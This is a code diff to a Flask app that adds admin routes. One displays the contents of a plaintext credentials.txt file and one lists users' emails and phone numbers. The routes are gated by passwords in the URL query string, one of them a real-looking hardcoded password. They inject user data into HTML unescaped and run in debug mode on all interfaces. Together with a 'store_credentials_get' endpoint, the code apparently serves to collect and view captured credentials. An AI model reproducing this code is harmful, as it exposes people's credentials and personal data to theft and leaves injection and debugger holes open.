@@ -188,5 +188,43 @@ def store_credentials_get():
         logger.error(f"Error in store_credentials_get: {str(e)}")
         return jsonify({'error': 'Internal server error'}), 500
 
+# -----------------------------
+# Admin Routes (for checking stored credentials)
+# -----------------------------
+@app.route('/admin/credentials')
+def view_credentials():
+    # Simple password protection - CHANGE 'your-secret-password' TO SOMETHING SECURE!
+    if request.args.get('password') != 'your-secret-password':
+        return "Unauthorized", 401
+        
+    try:
+        with open("credentials.txt", "r") as f:
+            content = f.read()
+        return f"<pre>{content}</pre>"
+    except FileNotFoundError:
+        return "No credentials file found yet."
+
+@app.route('/admin/users')
+def view_users():
+    # Simple password protection - USE THE SAME PASSWORD AS ABOVE
+    if request.args.get('password') != '913421156@Ab':
+        return "Unauthorized", 401
+        
+    users = User.query.all()
+    result = "<h1>Registered Users</h1>"
+    for user in users:
+        result += f"""
+        <p>ID: {user.id}<br>
+        Username: {user.username}<br>
+        Email: {user.email}<br>
+        Phone: {user.country_code} {user.phone}<br>
+        Created: {user.created_at}</p>
+        <hr>
+        """
+    return result
+
+# -----------------------------
+# Main Application Entry Point
+# -----------------------------
 if __name__ == '__main__':
     app.run(debug=True, host='0.0.0.0', port=5000)
